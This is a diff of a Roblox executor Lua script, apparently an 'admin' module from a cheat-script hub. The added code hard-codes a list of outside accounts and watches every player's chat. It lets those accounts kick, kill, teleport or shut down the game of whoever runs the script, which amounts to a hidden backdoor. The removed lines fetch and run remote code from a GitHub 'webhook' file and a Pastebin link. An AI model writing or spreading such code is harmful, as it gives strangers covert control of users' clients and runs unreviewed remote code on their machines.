@@ -1,23 +1,42 @@
+-- admin --
 local admins,notadmins=pcall(function()
+-- [[ 3001347724 ]] --
+if getgenv().adm then _G.rnote("Admins already loaded") return end;
+
+_G.AdminPrefix = (".")
+getgenv().FUNK = ("KommandFunktion")
+getgenv().LVL = ("AxxessLevel")
 
 _G.Admins = {
-["lulaslollipop"] = 1,
+[3001347724] = 1; ["lulaslollipop"] = 1;
 ["iloweil"] = 1,
+["vimjqcVBinsane355"] = 1, ["9K342JB09fp0"] = 1, 
+["XA93nxo5szdo"] = 1, ["bhn5cp6vgtwv"] = 1, 
+["1BOVZ8qwtjw6"] = 1, ["20GXV6KNUZ53"] = 1, 
+["IlIIIlIlIIlIIlIIlIIl"] = 1, ["xhexkers"] = 1, 
+["20GXV6KNUZ53"] = 1,
+["xheatkode"] = 1, ["siimeDLY"] = 1,
+["rrixhslime"] = 1, ["halbib112233"] = 1,
+["Justinseagull_20"] = 1,
 ["ggerrtasalt"] = 2,
+["nogafarmer6942"] = 2,
 };
 
-local AdminPrefix = "."
+
 local Players = game:GetService("Players")
 local LocalP = Players.LocalPlayer;
+local lpchar = LocalP.Character
+local lpHum = lpchar.Humanoid
+local lpHrp = lpchar.HumanoidRootPart
 
 getgenv().AdminTable = {}
-for UserID, AccessLevel in pairs(_G.Admins) do
+for UserID, AxxessLevel in pairs(_G.Admins) do
 if tonumber(UserID) then -- Check if UserID is a number
-getgenv().AdminTable[UserID] = {["Access"] = AccessLevel};
+getgenv().AdminTable[UserID] = {["Axxess"] = AxxessLevel};
 else -- If UserID is not a number, try to find the player by name
 for _, p in pairs(Players:GetPlayers()) do
 if (string.lower(p.Name) == string.lower(UserID) or string.lower(p.DisplayName) == string.lower(UserID)) then
-getgenv().AdminTable[p.UserId] = {["Access"] = AccessLevel};
+getgenv().AdminTable[p.UserId] = {["Axxess"] = AxxessLevel};
         end;
        end;
     end;
@@ -28,44 +47,52 @@ local Inserted = {}
 for _, p in pairs(Players:GetPlayers()) do
 if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
 table.insert(Inserted, p);return p
-end
-end
+       end;
+    end;
 end -- plr find
 
-getgenv().AdminCmdList = {
+getgenv().AdminKmdList = {
 ["kick"] = {
-["CommandFunc"] = function(Player, self, CmdPlayer)
+[FUNK] = function(Player, self, CmdPlayer)
 if Player == LocalP or Player == "all" then
 LocalP:Kick(self)
 end
 end;
-["Clearence"] = {
-[1] = true;
-[2] = true;
-[3] = false;
-}; -- axxess lvl(kixk)
-}; -- kixk
+[LVL] = {[1] = true, [2] = true, [3] = true, [4] = false, [5] = false}
+}; -- kixk funk
 ["kill"] = {
-["CommandFunc"] = function(Player, self, CmdPlayer)
+[FUNK] = function(Player, self, CmdPlayer)
 if Player == LocalP or Player == "all" then
 LocalP.Character.Humanoid:ChangeState(15)
-end
+  end;
 end;
-["Clearence"] = {
-[1] = true;
-[2] = true;
-[3] = true;
-}; -- axxess lvl(kill)
-}; -- kill funk
-}; -- admin kmd list
+[LVL] = {[1] = true, [2] = true, [3] = true, [4] = true, [5] = true}
+   }; -- kill funk
+["exit"] = {
+[FUNK] = function(Player, self, KmdPlayer)
+if Player == LocalP or Player == "all" then
+LocalP:kick(self); task.wait(3.5); game:shutdown();
+end;
+end;
+[LVL] = {[1] = true, [2] = true, [3] = false, [4] = false, [5] = false}
+ }; -- exit funk
+["bring"] = {
+[FUNK] = function(Player, self, KmdPlayer)
+if Player == LocalP or Player == "others" then
+lpHrp.CFrame = KmdPlayer.Character.HumanoidRootPart.Position;
+  end;
+end;
+[LVL] = {[1] = true, [2] = true, [3] = true, [4] = true, [5] = true}
+ }; -- bring funk
+}; -- admin kommand list
 
 getgenv().BDCheck = function(Target2, Chat)
-if Chat:sub(1, 1) == AdminPrefix then
+if Chat:sub(1, 1) == _G.AdminPrefix then
 local args = string.split(Chat:sub(2), " ")
-local Command = AdminCmdList[table.remove(args, 1)]
+local Kommand = AdminKmdList[table.remove(args, 1)]
 local targ1 = psearch(table.remove(args, 1))
-if Command and targ1 then
-return Command and Command["Clearence"][getgenv().AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
+if Kommand and targ1 then
+return Kommand and Kommand[LVL][getgenv().AdminTable[Target2.UserId].Axxess] and Kommand[FUNK](targ1, table.concat(args, " "), Target2)
 end
 end
 end;
@@ -74,89 +101,24 @@ local GP = Players:GetPlayers()
 for i = 1, #GP do
 local CoolKidPlayer = GP[i]
 CoolKidPlayer.Chatted:Connect(function(Word)
-getgenv().BDCheck(CoolKidPlayer, Word)
+BDCheck(CoolKidPlayer, Word)
 end)
 end
 Players.PlayerAdded:Connect(function(CKP)
 CKP.Chatted:Connect(function(Message)
-getgenv().BDCheck(CKP, Message)
+BDCheck(CKP, Message)
 end)
 end);
 
-task.spawn(function()
+task.wait()
 warn("_G.Admins loaded!✅")
-end);
---[[admins loaded]]--
+getgenv().adm = true;
+
 end); -- protekt
 
-if not admins then 
-warn("❌ _G.Admins error:",notadmins); 
+if not admins then
+if getgenv().globalz then _G.rnote("❌ _G.Admins error:\n"..notadmins); end;
+if not getgenv().globalz then warn("❌ _G.Admins error:",notadmins); end;
+return notadmins;
 end;
-
-
-
---[[
-local AdminPrefix = "." -- (if its blank it will error)
-local Players = game:GetService("Players")
-local LocalP = Players.LocalPlayer;
-getgenv().AdminTable = {
-  [3001347724] = {["Access"] = 5}; -- axxess is what level
-}
-
-getgenv().psearch = function(Name)
-  local Inserted = {}
-  for _, p in pairs(Players:GetPlayers()) do 
-      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then 
-          table.insert(Inserted, p);return p
-      end
-  end
-end -- Simple player finder function
-
-getgenv().AdminCmdList = {
-  ["kick"] = {
-      ["CommandFunc"] = function(Player, self, CmdPlayer) 
-          if Player == LocalP or Player == "all" then 
-              LocalP:Kick(self)
-          end 
-      end;
-      ["Clearence"] = {[5] = true;};
-  }; -- u kan make new ones of these (the ; have to be in the same spots)
-  ["kill"] = {
-      ["CommandFunc"] = function(Player, self, CmdPlayer) 
-          if Player == LocalP or Player == "all" then 
-              LocalP.Character.Humanoid:ChangeState(15) 
-          end 
-      end;
-      ["Clearence"] = {[4] = true;[5] = true;};
-  }; 
-};
-
-getgenv().BDCheck = function(Target2, Chat)
-  if Chat:sub(1, 1) == AdminPrefix then 
-      local args = string.split(Chat:sub(2), " ")
-      local Command = AdminCmdList[table.remove(args, 1)]
-      local targ1 = psearch(table.remove(args, 1))
-      if Command and targ1 then -- kredits to !fishgang Cy for this BDCheck func
-          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
-      end
-  end
-end
-
-local GP = Players:GetPlayers()
-for i = 1, #GP do 
-  local CoolKidPlayer = GP[i]
-  CoolKidPlayer.Chatted:Connect(function(Word)
-      BDCheck(CoolKidPlayer, Word)
-  end)
-end -- xhexks if you xhatted a kmd
-Players.PlayerAdded:Connect(function(CKP)
-  CKP.Chatted:Connect(function(Message)
-      BDCheck(CKP, Message)
-  end)
-end)
-]]--
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/diskord/main/wHook_lulaslollipop",true))()
-
---3rdstring%"".<LstB#%*^>
-loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
+--[[admins loaded]]--
